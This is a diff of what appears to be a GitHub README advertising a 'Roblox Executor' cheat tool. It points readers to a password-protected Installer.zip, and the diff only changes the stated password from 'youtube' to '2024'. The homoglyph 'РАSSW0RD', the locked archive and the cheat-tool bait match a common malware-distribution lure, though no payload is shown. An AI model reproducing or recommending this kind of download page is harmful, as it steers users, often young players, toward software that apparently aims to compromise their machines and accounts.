@@ -1,7 +1,7 @@
 > [!TIP]
 > ***How to download:***
 
-### РАSSW0RD - youtube
+### РАSSW0RD - 2024
 
 # DOWNLOAD: [Click Here](https://github.com/epicgibtschelle/Roblox-Executor/releases/download/RBX/Installer.zip)
 
